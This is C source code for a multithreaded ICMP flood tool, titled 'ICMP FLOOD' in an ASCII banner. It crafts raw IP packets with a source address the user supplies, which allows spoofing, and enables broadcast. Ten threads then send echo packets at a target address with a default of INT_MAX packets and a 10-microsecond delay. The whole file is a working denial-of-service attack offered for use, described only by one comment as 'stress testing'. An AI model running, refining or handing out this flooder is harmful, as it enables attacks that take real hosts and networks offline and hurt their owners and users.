#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <time.h>
#include <limits.h>

#define BUFFER_SIZE 65535
#define PACKET_DELAY_USEC 10 // Reduced delay for faster packet sending
#define DEF_NUM_PACKETS INT_MAX // Default to maximum integer for stress testing
#define MAX_THREADS 10

char buf[BUFFER_SIZE];

typedef struct {
    char src_ip[INET_ADDRSTRLEN];
    char dst_ip[INET_ADDRSTRLEN];
    int num_packets;
} flood_args_t;

char *usage = "\nUsage: ./icmp-flood <src_ip> <dst_ip> <packets>\n \
    <src_ip> = Source IP address\n \
    <dst_ip> = Target IP address\n \
    <packets> = Number of packets to send\n \
    Example: ./icmp-flood 127.0.0.1 72.92.38.28 10000\n";

void print_ascii_art()
{
    printf("\n      ██╗ ██████╗███╗   ███╗██████╗     \n");
    printf("        ██║██╔════╝████╗ ████║██╔══██╗    \n");
    printf("        ██║██║     ██╔████╔██║██████╔╝    \n");
    printf("        ██║██║     ██║╚██╔╝██║██╔═══╝     \n");
    printf("        ██║╚██████╗██║ ╚═╝ ██║██║         \n");
    printf("        ╚═╝ ╚═════╝╚═╝     ╚═╝╚═╝         \n");
    printf("                                        \n");
    printf("███████╗██╗      ██████╗  ██████╗ ██████╗ \n");
    printf("██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗\n");
    printf("█████╗  ██║     ██║   ██║██║   ██║██║  ██║\n");
    printf("██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║\n");
    printf("██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝\n");
    printf("╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ \n");
    printf("                                        \n");
}

void set_ip_layer_fields(struct ip *ip, struct icmphdr *icmp)
{
    ip->ip_v = 4;
    ip->ip_hl = sizeof(struct ip) >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(sizeof(struct ip) + sizeof(struct icmphdr) + 64); // Increased payload size
    ip->ip_id = htons(rand() % 65535); // Randomize ID
    ip->ip_off = 0;
    ip->ip_ttl = 255;
    ip->ip_p = IPPROTO_ICMP;
    ip->ip_sum = 0; // Kernel will fill in

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0; // Checksum will be calculated later
}

unsigned short calculate_checksum(unsigned short *paddress, int len)
{
    unsigned long sum = 0;
    unsigned short odd_byte;
    unsigned short answer = 0;

    while (len > 1) {
        sum += *paddress++;
        len -= 2;
    }

    if (len == 1) {
        *(unsigned char *)(&odd_byte) = *(unsigned char *)paddress;
        sum += odd_byte;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

void set_socket_options(int s)
{
    int on = 1;

    if (setsockopt(s, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0) {
        perror("setsockopt() for BROADCAST error");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt() for IP_HDRINCL error");
        exit(EXIT_FAILURE);
    }
}

void *send_packets(void *args)
{
    flood_args_t *flood_args = (flood_args_t *)args;
    int s;
    struct ip *ip = (struct ip *)buf;
    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
    struct sockaddr_in dst;
    int num_packets = flood_args->num_packets;
    int i;

    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() error");
        pthread_exit(NULL);
    }

    set_socket_options(s);

    dst.sin_family = AF_INET;
    dst.sin_port = 0;
    dst.sin_addr.s_addr = inet_addr(flood_args->dst_ip);

    srand(time(NULL)); // Seed random number generator

    for (i = 0; i < num_packets; i++) {
        memset(buf, 0, sizeof(buf));

        ip->ip_src.s_addr = inet_addr(flood_args->src_ip);
        ip->ip_dst.s_addr = dst.sin_addr.s_addr;

        set_ip_layer_fields(ip, icmp);

        ip->ip_sum = calculate_checksum((unsigned short *)ip, sizeof(struct ip));
        icmp->checksum = calculate_checksum((unsigned short *)icmp, sizeof(struct icmphdr) + 64);

        if (sendto(s, buf, ntohs(ip->ip_len), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            fprintf(stderr, "Error during packet send: %s\n", strerror(errno));
        } else {
            printf("Packet sent to %s\n", inet_ntoa(ip->ip_dst));
        }

        usleep(PACKET_DELAY_USEC); // Reduced delay
    }

    close(s);
    pthread_exit(NULL);
}

int main(int argc, char *argv[])
{
    pthread_t threads[MAX_THREADS];
    flood_args_t flood_args;
    int num_threads = MAX_THREADS;

    print_ascii_art();

    if (argc < 3 || argc > 4) {
        fprintf(stderr, "%s\n", usage);
        exit(EXIT_FAILURE);
    }

    strncpy(flood_args.src_ip, argv[1], INET_ADDRSTRLEN);
    strncpy(flood_args.dst_ip, argv[2], INET_ADDRSTRLEN);

    if (argc == 4) {
        flood_args.num_packets = atoi(argv[3]);
        if (flood_args.num_packets <= 0) {
            fprintf(stderr, "Number of packets must be a positive integer.\n");
            exit(EXIT_FAILURE);
        }
    } else {
        flood_args.num_packets = DEF_NUM_PACKETS;
    }

    if (inet_aton(flood_args.src_ip, &(struct in_addr){0}) == 0) {
        fprintf(stderr, "%s: Invalid source IP address.\n", flood_args.src_ip);
        exit(EXIT_FAILURE);
    }

    if (inet_aton(flood_args.dst_ip, &(struct in_addr){0}) == 0) {
        fprintf(stderr, "%s: Invalid destination IP address.\n", flood_args.dst_ip);
        exit(EXIT_FAILURE);
    }

    // Create multiple threads for concurrent packet sending
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, &flood_args)) {
            perror("pthread_create() error");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return EXIT_SUCCESS;
}
